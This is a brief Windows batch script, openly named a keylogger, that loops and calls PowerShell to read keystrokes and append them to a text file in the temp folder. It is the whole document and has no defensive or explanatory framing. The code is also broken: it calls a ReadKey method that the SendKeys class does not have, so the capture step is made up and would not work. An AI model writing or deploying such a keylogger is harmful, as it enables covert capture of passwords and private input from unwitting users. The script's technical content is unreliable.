@echo off
setlocal EnableDelayedExpansion

set "logfile=%TEMP%\keylogger.txt"

:listen
powershell.exe -Command "& {Add-Type -AssemblyName System.Windows.Forms; $key = [System.Windows.Forms.SendKeys]::ReadKey(); Out-File -FilePath '%logfile%' -Append -InputObject $key}"
goto listen
